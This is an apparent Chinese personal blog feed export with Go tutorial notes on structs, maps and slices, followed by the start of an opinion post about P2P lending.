<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">fzy 23</div></pre></td></tr></table></figure>
<h4 id="递归结构体"><a href="#递归结构体" class="headerlink" title="递归结构体"></a>递归结构体</h4><p>　　结构体类型可以通过引用自身来定义。这在定义链表或二叉树的元素（通常叫节点）时特别有用，此时节点包含指向临近节点的链接（地址）。如下所示，链表中的 <code>su</code>，树中的 <code>ri</code> 和 <code>le</code> 分别是指向别的节点的指针。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Node <span class="keyword">struct</span> &#123;</div><div class="line">    data    <span class="keyword">float64</span></div><div class="line">    su      *Node</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　同样地可以定义一个双向链表，它有一个前趋节点 <code>pr</code> 和一个后继节点 <code>su</code>：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Node <span class="keyword">struct</span> &#123;</div><div class="line">    pr      *Node</div><div class="line">    data    <span class="keyword">float64</span></div><div class="line">    su      *Node</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　二叉树中每个节点最多能链接至两个节点：左节点（le）和右节点（ri），这两个节点本身又可以有左右节点，依次类推。树的顶层节点叫根节点（<strong>root</strong>），底层没有子节点的节点叫叶子节点（<strong>leaves</strong>），叶子节点的 <code>le</code> 和 <code>ri</code> 指针为 nil 值。在 Go 中可以如下定义二叉树：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Tree strcut &#123;</div><div class="line">    le      *Tree</div><div class="line">    data    <span class="keyword">float64</span></div><div class="line">    ri      *Tree</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="内嵌结构体"><a href="#内嵌结构体" class="headerlink" title="内嵌结构体"></a>内嵌结构体</h4><p>　　结构体可以包含一个或多个 <strong>匿名（或内嵌）字段</strong>，即这些字段没有显式的名字，只有字段的类型是必须的，此时类型就是字段的名字。但是，在一个结构体中对于每一种数据类型只能有一个匿名字段。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</div><div class="line">    name <span class="keyword">string</span></div><div class="line">    <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">    p := Person&#123;<span class="string">"fzy"</span>, <span class="number">23</span>&#125;</div><div class="line">    fmt.Println(p.name, p.<span class="keyword">int</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">fzy 23</div></pre></td></tr></table></figure>
<p>　　匿名字段本身可以是一个结构体类型，即 <strong>结构体可以包含内嵌结构体</strong>。Go 语言中的继承是通过内嵌或组合来实现的，所以可以说，在 Go 语言中，相比较于继承，组合更受青睐。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</div><div class="line">    name <span class="keyword">string</span></div><div class="line">    age  <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</div><div class="line">    Person</div><div class="line">    number <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">    s := Student&#123;Person&#123;<span class="string">"fzy"</span>, <span class="number">23</span>&#125;, <span class="number">111</span>&#125;</div><div class="line">    fmt.Println(s.name, s.age, s.number)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">fzy 23 111</div></pre></td></tr></table></figure>
<p>　　外层结构体通过 `s.name直接进入内层结构体的字段，内嵌结构体甚至可以来自其他包。内层结构体被简单的插入或者内嵌进外层结构体。这个简单的“继承”机制提供了一种方式，使得可以从另外一个或一些类型继承部分或全部实现。</p>
<p>　　当两个字段拥有相同的名字（可能是继承来的名字）时：</p>
<ul>
<li>外层名字会覆盖内层名字（但是两者的内存空间都保留），这提供了一种重载字段或方法的方式；</li>
<li>如果相同的名字在同一级别出现了两次，如果这个名字被程序使用了，将会引发一个错误。没有办法来解决这种问题引起的二义性，必须由程序员自己修正。</li>
</ul>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-Map</title>
    <url>/2018/08/27/Golang%20%E7%AC%94%E8%AE%B0-Map/</url>
    <content><![CDATA[<center>Golang Map 学习。</center>

<a id="more"></a>
<h4 id="map-简介"><a href="#map-简介" class="headerlink" title="map 简介"></a>map 简介</h4><p>　　<code>map</code> 是一种特殊的数据结构：一种元素对（pair）的无序集合，pair 的一个元素是 <code>key</code>，对应的另一个元素是 <code>value</code>，所以这个结构也称为关联数组或字典。这是一种快速寻找值的理想结构：给定 <code>key</code>，对应的 <code>value</code> 可以迅速定位。在其他编程语言中 <code>map</code> 也称为字典（Python）、hash 和 HashTable 等。</p>
<p>　　<code>map</code> 中所有的 <code>key</code> 都拥有相同的数据类型，同时所有的 <code>value</code> 也拥有相同的数据类型，但 <code>key</code> 和 <code>value</code> 的类型不一定一样。</p>
<p>　　<code>key</code> 可以是任意可以用 <code>==</code> 或者 <code>!=</code> 操作符比较的类型，比如 <code>string</code>、<code>int</code>、<code>float</code>。所以数组、切片和结构体不能作为 <code>key</code> (含有数组切片的结构体不能作为 <code>key</code>，只包含内建类型的 <code>struct</code> 是可以作为 <code>key</code> 的），但是指针和接口类型可以。</p>
<p>　　通过 <code>key</code> 在 <code>map</code> 中寻找值是很快的，比线性查找快得多，但是仍然比从数组和切片的索引中直接读取要慢 100 倍。 </p>
<p>　　由于 <code>map</code> 使用了散列表，所以即使使用相同的顺序保存键值对，每次迭代 <code>map</code> 的时候顺序也有可能不一样。因此，<code>map</code> 是一个存储键值对的无序集合。</p>
<h4 id="声明与初始化"><a href="#声明与初始化" class="headerlink" title="声明与初始化"></a>声明与初始化</h4><p>　　在声明的时候不需要知道 <code>map</code> 的长度，<code>map</code> 是可以动态增长的。未初始化的 <code>map</code> 的值是 <code>nil</code>。<code>map</code> 是 <strong>引用类型</strong> 的： 内存用 <code>make</code> 方法来分配。<code>map</code> 的初始化：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> map1 = <span class="built_in">make</span>(<span class="keyword">map</span>[keytype]valuetype)</div></pre></td></tr></table></figure>
<p>　　或者使用简短声明：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">map1 := <span class="built_in">make</span>(<span class="keyword">map</span>[keytype]valuetype)</div></pre></td></tr></table></figure>
<p>　　也可以使用 <code>map</code> 的字面量来创建并初始化：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">map1 := <span class="keyword">map</span>[keytype]valuetype&#123;key:  value, key : value, ......&#125;</div></pre></td></tr></table></figure>
<p>　　举例：</p>
<ul>
<li>使用 <code>make</code>：</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">ages := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</div><div class="line">fmt.Println(ages[<span class="string">"Tom"</span>])	<span class="comment">// 没有赋值，实际上根本不存在这个键</span></div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">0</div></pre></td></tr></table></figure>
<ul>
<li>使用字面量：</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">ages := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>&#123;<span class="string">"Jack"</span>: <span class="number">20</span>, <span class="string">"Tom"</span>: <span class="number">18</span>&#125;</div><div class="line">fmt.Println(ages[<span class="string">"Tom"</span>])</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">18</div></pre></td></tr></table></figure>
<p>　　和数组不同，<code>map</code> 可以根据新增的 <code>key-value</code> 对动态的伸缩，因此它不存在固定长度或者最大限制。但是你也可以选择标明 <code>map</code> 的初始容量 <code>capacity</code> ：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">make(map[keytype]valuetype, cap)</div></pre></td></tr></table></figure>
<p>　　当 <code>map</code> 增长到容量上限的时候，如果再增加新的 <code>key-value</code> 对，<code>map</code> 的大小会自动加 1。所以出于性能的考虑，对于大的 <code>map</code> 或者会快速扩张的 <code>map</code>，即使只是大概知道容量，也最好先标明。</p>
<h4 id="map-操作"><a href="#map-操作" class="headerlink" title="map 操作"></a>map 操作</h4><h5 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line">ages := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</div><div class="line">ages[<span class="string">"Jack"</span>] = <span class="number">20</span>	<span class="comment">// 赋值</span></div><div class="line">ages[<span class="string">"Tom"</span>] = <span class="number">18</span></div><div class="line">fmt.Println(ages[<span class="string">"Tom"</span>])</div></pre></td></tr></table></figure>
<h5 id="测试键值对是否存在"><a href="#测试键值对是否存在" class="headerlink" title="测试键值对是否存在"></a>测试键值对是否存在</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">value, isPresent := map[key]</div></pre></td></tr></table></figure>
<p>　　<code>isPresent</code> 返回一个 <code>bool</code> 值：如果 <code>key</code> 存在于 <code>map</code>，<code>value</code> 就是 <code>key</code> 对应的 <code>value</code> 值，并且 <code>isPresent</code> 为 <code>true</code>；如果 <code>key</code> 不存在，<code>value</code> 就是一个空值，并且 <code>isPresent</code> 会返回 <code>false</code>。 </p>
<p>　　比如前面的例子中：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">ages := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</div><div class="line">value, isPresent := ages[<span class="string">"Tom"</span>]	<span class="comment">// 没有赋值</span></div><div class="line">fmt.Println(value, isPresent)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="number">0</span> <span class="literal">false</span></div></pre></td></tr></table></figure>
<p>　　和 if 混合使用： </p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> _, ok := <span class="keyword">map</span>[key]; ok &#123;</div><div class="line">	<span class="comment">// 如果存在...</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="删除键值对"><a href="#删除键值对" class="headerlink" title="删除键值对"></a>删除键值对</h5><p>　　<code>delete()</code> 函数用于删除集合的元素, 参数为 <code>map</code> 和其对应的 <code>key</code>。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="built_in">delete</span>(<span class="keyword">map</span>, key)</div></pre></td></tr></table></figure>
<p>　　即使键不在 <code>map</code> 中，上面的操作也是安全的。<code>map</code> 使用给定的键来查找元素，如果键对应的元素不存在，就返回值类型的零值。</p>
<h4 id="map-迭代"><a href="#map-迭代" class="headerlink" title="map 迭代"></a>map 迭代</h4><p>　　使用 <code>for-range</code> 结构遍历 <code>map</code>，第一个返回值 <code>key</code> 是 <code>map</code> 中的 <code>key</code> 值，第二个返回值则是该 <code>key</code> 对应的 <code>value</code> 值；这两个都是仅 <code>for</code> 循环内部可见的局部变量。 </p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">ages := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>&#123;<span class="string">"Jack"</span>: <span class="number">20</span>, <span class="string">"Tom"</span>: <span class="number">18</span>&#125;</div><div class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> ages &#123;</div><div class="line">    fmt.Println(key, value)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Jack 20</div><div class="line">Tom 18</div></pre></td></tr></table></figure>
<p>　　只获取值：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> ages &#123;</div><div class="line">    fmt.Println(value)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">18</div><div class="line">20</div></pre></td></tr></table></figure>
<p>　　注意 <code>map</code> 不是按照 <code>key</code> 的顺序排列的，也不是按照 <code>value</code> 的序排列的，有可能每次打印的输出结果顺序都不同，所以这里并没有按上面的顺序打印。</p>
<p>　　只获取键：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> key := <span class="keyword">range</span> ages &#123;</div><div class="line">    fmt.Println(key)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Jack</div><div class="line">Tom</div></pre></td></tr></table></figure>
<h4 id="map-排序"><a href="#map-排序" class="headerlink" title="map 排序"></a>map 排序</h4><p>　　<code>map</code> 默认是无序的，不管是按照 <code>key</code> 还是按照 <code>value</code> 默认都不排序。如果要为 <code>map</code> 排序，需要将 <code>key</code>（或者 <code>value</code>）拷贝到一个切片，再对切片排序，然后可以使用切片的 <code>for-range</code> 方法打印出所有的 <code>key</code> 和 <code>value</code>。</p>
<p>　　按值排序，即把值拷贝到切片，然后再对切片进行排序：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">ages := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>&#123;<span class="string">"Jack"</span>: <span class="number">20</span>, <span class="string">"Tom"</span>: <span class="number">18</span>, <span class="string">"Ada"</span>: <span class="number">28</span>, <span class="string">"Peter"</span>: <span class="number">30</span>&#125;</div><div class="line">keys := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="built_in">len</span>(ages))</div><div class="line">i := <span class="number">0</span></div><div class="line"><span class="keyword">for</span> k, _ := <span class="keyword">range</span> ages &#123;	<span class="comment">// 把键拷贝到切片</span></div><div class="line">    keys[i] = k</div><div class="line">    i++</div><div class="line">&#125;</div><div class="line">sort.Strings(keys)	<span class="comment">// 按键排序</span></div><div class="line"><span class="keyword">for</span> _, k := <span class="keyword">range</span> keys &#123;	<span class="comment">// 按键排序后的顺序输出</span></div><div class="line">    fmt.Println(k, ages[k])</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Ada 28</div><div class="line">Jack 20</div><div class="line">Peter 30</div><div class="line">Tom 18</div></pre></td></tr></table></figure>
<p>　　按键排序，即把键拷贝到切片，然后再对切片进行排序：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">ages := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>&#123;<span class="string">"Jack"</span>: <span class="number">20</span>, <span class="string">"Tom"</span>: <span class="number">18</span>, <span class="string">"Ada"</span>: <span class="number">28</span>, <span class="string">"Peter"</span>: <span class="number">30</span>&#125;</div><div class="line">values := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="built_in">len</span>(ages))</div><div class="line">i := <span class="number">0</span></div><div class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> ages &#123;</div><div class="line">    values[i] = v	<span class="comment">// 把值拷贝到切片</span></div><div class="line">    i++</div><div class="line">&#125;</div><div class="line">sort.Ints(values)	<span class="comment">// 按值排序</span></div><div class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> values &#123;	<span class="comment">// 输出排序结果</span></div><div class="line">    fmt.Println(v)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">18</div><div class="line">20</div><div class="line">28</div><div class="line">30</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-切片</title>
    <url>/2018/08/26/Golang%20%E7%AC%94%E8%AE%B0-%E5%88%87%E7%89%87/</url>
    <content><![CDATA[<center>Golang 切片学习</center>

<a id="more"></a>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>　　切片（slice）是对数组一个连续片段的引用，所以切片是一个引用类型（因此更类似于 C/C++ 中的数组类型，或者 Python 中的 list 类型）。这个片段可以是整个数组，或者是由起始和终止索引标识的一些项的子集。需要注意的是，终止索引标识的项不包括在切片内。</p>
<p>　　切片在内存中的组织方式实际上是一个有 3 个域的结构体：指向相关数组的指针，切片长度以及切片容量。给定项的切片索引可能比相关数组的相同元素的索引小。和数组不同的是，切片的长度可以在运行时修改，最小为 0 最大为相关数组的长度：切片是一个 <strong>长度可变的数组</strong>。</p>
<p>　　切片是可索引的，并且可以由 <code>len()</code> 函数获取长度。因为切片是引用，所以它们不需要使用额外的内存并且比使用数组更有效率，所以在 <strong>Go 语言中切片比数组更常用</strong>。</p>
<h4 id="声明与初始化"><a href="#声明与初始化" class="headerlink" title="声明与初始化"></a>声明与初始化</h4><p>　　声明切片的格式：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> identifier []<span class="keyword">type</span></div></pre></td></tr></table></figure>
<p>　　<code>[]</code> 中不需要指定长度值，如果指定长度即为数组。一个切片在未初始化之前默认为 nil，长度为 0。声明的同时初始化：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> slice []<span class="keyword">type</span> = arr1[start:end]</div></pre></td></tr></table></figure>
<p>　　这表示 <code>slice</code> 是由数组 <code>arr</code> 从 <code>start</code> 索引到 <code>end-1</code> 索引之间的元素构成的子集（切分数组，<code>start:end</code> 被称为 <code>slice</code> 表达式）。所以 <code>slice[0]</code> 就等于 <code>arr[start]</code>。</p>
<p>　　切片也可以用类似数组的方式初始化：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> slice = []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</div></pre></td></tr></table></figure>
<p>　　另外，也可以使用简短声明并进行初始化：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">slice := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</div></pre></td></tr></table></figure>
<p>　　也可以使用内置函数 <code>make</code> 创建切片，make 的使用方式是：<code>func make([]T, len, cap)</code>，其中 cap 是容量（可选参数），当只指定切片的长度时：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">slice := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">3</span>)	<span class="comment">// 长度和容量均为3</span></div></pre></td></tr></table></figure>
<p>　　如果只指定长度，那么切片的容量和长度相等。也可以长度和容量都指定：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">slice := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">3</span>, <span class="number">5</span>)	<span class="comment">// 长度为3，容量为5</span></div></pre></td></tr></table></figure>
<p>　　空切片与 <code>nil</code> 切片：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">slice := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>)	<span class="comment">// 长度为0的切片</span></div><div class="line"><span class="keyword">var</span> slice []<span class="keyword">int</span>	<span class="comment">// 初始化值为nil的切片</span></div></pre></td></tr></table></figure>
<h4 id="切片处理"><a href="#切片处理" class="headerlink" title="切片处理"></a>切片处理</h4><h5 id="赋值和切片"><a href="#赋值和切片" class="headerlink" title="赋值和切片"></a>赋值和切片</h5><p>　　赋值操作：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">slice := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</div><div class="line">slice[<span class="number">1</span>] = <span class="number">6</span>	<span class="comment">// 改变索引为1的元素的值</span></div></pre></td></tr></table></figure>
<p>　　使用切片创建切片：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">slice := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</div><div class="line">newSlice := slice[<span class="number">1</span>:<span class="number">3</span>]	<span class="comment">// 长度为2，容量为4</span></div><div class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> newSlice &#123;</div><div class="line">    fmt.Println(i, v)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">0 2</div><div class="line">1 3</div></pre></td></tr></table></figure>
<p>　　<code>slice</code> 底层数组有5个元素 , 而 <code>newSlice</code> 的底层数组容量只有4个元素，<code>newSlice</code> 看不到。但是，由于两个切片共享了底层数组，所以如果一个切片修改了底层数组的共享部分，另一个切片也会感知到。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">slice := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</div><div class="line">newSlice := slice[<span class="number">1</span>:<span class="number">3</span>] <span class="comment">// 长度为2，容量为4</span></div><div class="line">newSlice[<span class="number">0</span>] = <span class="number">6</span></div><div class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> slice &#123;</div><div class="line">    fmt.Println(i, v)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">0 1</div><div class="line">1 6</div><div class="line">2 3</div><div class="line">3 4</div><div class="line">4 5</div></pre></td></tr></table></figure>
<h5 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h5><p>　　如果想增加切片的容量，我们必须创建一个新的更大的切片并把原分片的内容都拷贝过来。<code>copy</code> 函数提供了这样的功能：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">copy</span><span class="params">(dst, src []T)</span> <span class="title">int</span></span></div></pre></td></tr></table></figure>
<p>　　它将类型为 T 的切片从源地址 src 拷贝到目标地址 dst，覆盖 dst 的相关元素，并且返回拷贝的元素个数。源地址和目标地址可能会有重叠。拷贝个数是 src 和 dst 的长度最小值。如果 src 是字符串那么元素类型就是 byte。如果你还想继续使用 src，在拷贝结束后执行 <code>src = dst</code>。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">s := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</div><div class="line">slice := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">5</span>)</div><div class="line"><span class="built_in">copy</span>(slice, s)</div><div class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> slice &#123;</div><div class="line">    fmt.Println(i, v)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">0 1</div><div class="line">1 2</div><div class="line">2 3</div><div class="line">3 0</div><div class="line">4 0</div></pre></td></tr></table></figure>
<h5 id="增长"><a href="#增长" class="headerlink" title="增长"></a>增长</h5><p>　　内置函数 <code>append</code> 会处理增加长度时的所有操作细节：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">append</span><span class="params">(s[]T, x ...T)</span> []<span class="title">T</span></span></div></pre></td></tr></table></figure>
<p>　　它将0 个或多个具有相同类型 s 的元素追加到切片后面并且返回新的切片；追加的元素必须和原切片的元素同类型。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">slice := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">3</span>, <span class="number">5</span>)</div><div class="line">slice[<span class="number">0</span>] = <span class="number">1</span></div><div class="line">slice[<span class="number">1</span>] = <span class="number">2</span></div><div class="line">slice[<span class="number">2</span>] = <span class="number">3</span></div><div class="line">slice = <span class="built_in">append</span>(slice, <span class="number">4</span>, <span class="number">5</span>) <span class="comment">// 添加两个元素</span></div><div class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> slice &#123;</div><div class="line">    fmt.Println(i, v)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">0 1</div><div class="line">1 2</div><div class="line">2 3</div><div class="line">3 4</div><div class="line">4 5</div></pre></td></tr></table></figure>
<p>　　如果 s 的容量不足以存储新增元素，append 会分配新的切片来保证已有切片元素和新增元素的存储。因此，返回的切片可能已经指向一个不同的相关数组了。append 方法总是返回成功，除非系统内存耗尽了。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">slice := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;	<span class="comment">// 长度和容量均为3</span></div><div class="line">slice = <span class="built_in">append</span>(slice, <span class="number">4</span>, <span class="number">5</span>)	<span class="comment">// 添加两个元素后，slice拥有一个全新的底层数组</span></div><div class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> slice &#123;</div><div class="line">	fmt.Println(i, v)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果同上。</p>
<h5 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h5><p>　　与增长类似，我们也可以合并两个 <code>slice</code> ，其本质是将一个 <code>slice</code> 追加到另一个的后面：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">slice := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</div><div class="line">slice2 := []<span class="keyword">int</span>&#123;<span class="number">4</span>, <span class="number">5</span>&#125;</div><div class="line">slice = <span class="built_in">append</span>(slice, slice2...)</div><div class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> slice &#123;</div><div class="line">    fmt.Println(i, v)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果同上。</p>
<h4 id="迭代切片"><a href="#迭代切片" class="headerlink" title="迭代切片"></a>迭代切片</h4><h5 id="传统for循环"><a href="#传统for循环" class="headerlink" title="传统for循环"></a>传统for循环</h5><p>　　内置函数 <code>len()</code> 和 <code>cap()</code> 可以用于处理数组、切片和通道，分别获取长度和容量。于是，可以使用传统 <code>for</code> 循环迭代切片：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">slice := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</div><div class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(slice); i++ &#123;</div><div class="line">    fmt.Println(i, slice[i])</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">0 1</div><div class="line">1 2</div><div class="line">2 3</div><div class="line">3 4</div><div class="line">4 5</div></pre></td></tr></table></figure>
<h5 id="for-range"><a href="#for-range" class="headerlink" title="for range"></a>for range</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line">slice := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</div><div class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> slice &#123;</div><div class="line">    fmt.Println(i, v)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">0 1</div><div class="line">1 2</div><div class="line">2 3</div><div class="line">3 4</div><div class="line">4 5</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈-P2P 金融</title>
    <url>/2018/08/25/%E6%B5%85%E8%B0%88-P2P%20%E9%87%91%E8%9E%8D/</url>
    <content><![CDATA[<p>　　前几天，实验室同门突然开始讨论一个话题：P2P金融，大家各抒己见，觉得还蛮有意思。自己对这方面有所了解，但也不是十分清楚，所以利用周末的时间补了补课，然后写下这篇博客分享一下。</p>
<a id="more"></a>
<p>　　P2P金融又叫P2P信贷，是互联网金融的一种。P2P原本是计算机网络中的术语，后来由于迅雷、快播的兴起而被大众熟知。P2P的意思就是点对点，拿到金融领域的意思是“个人对个人”的借贷和投资，这比银行的存贷款利息高，也更自由。</p>
<p>　　那么，P2P金融模式存在的价值在哪里？P2P金融的初衷是让资金供方与资金需方直接对接，其价值是减少中间环节、提高效率、降低成本。有人说，互联网金融是为国为民，给实业输血。为什么说给实业输血？因为投入给实体经济的钱太少了。看看现在的股市，再看看现在的房市就知道了，股市一片惨淡，而房市还是一如既往的火热，很多资金其实都流入了房市。有钱的人都去投资房产了，因为涨得快，赚得也就快。因此，在我国，中小微企业融资难、融资贵，一直是未能解决的问题。虽然我国的中小微企业发展迅速，已经成为国民经济的重要组成部分，在扩大就业、发展经济、活跃市场方面发挥着十分重要的作用，但是小微企业融资仍然较困难。</p>
